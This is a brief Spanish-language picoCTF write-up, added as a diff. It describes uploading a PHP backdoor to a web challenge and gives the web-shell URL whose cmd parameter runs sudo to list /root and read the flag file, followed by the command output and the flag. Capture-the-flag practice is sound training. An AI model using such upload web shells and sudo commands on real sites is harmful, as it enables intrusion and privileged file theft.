@@ -1,0 +1,16 @@
+cargamos el archivo backdoor que contiene un payload clasico de php para cuando se lo inyectamos a una pagina web accedamos al cmd mediante el link y luego hacemos 
+
+                                                                                                                                                                  
+http://standard-pizzas.picoctf.net:59291/uploads/backdoor.php?cmd=cd%20;%20sudo%20ls%20-la%20/root%20;%20sudo%20cat%20/root/flag.txt
+
+vamos a ese link, claro con tu puerto y nos muestra esto
+
+total 12
+drwx------ 1 root root  22 Aug 21  2025 .
+drwxr-xr-x 1 root root  39 Jun  8 19:06 ..
+-rw-r--r-- 1 root root 571 Apr 10  2021 .bashrc
+-rw-r--r-- 1 root root 161 Jul  9  2019 .profile
+-rw-r--r-- 1 root root  36 Aug 21  2025 flag.txt
+picoCTF{wh47_c4n_u_d0_wPHP_123198f1}
+
+
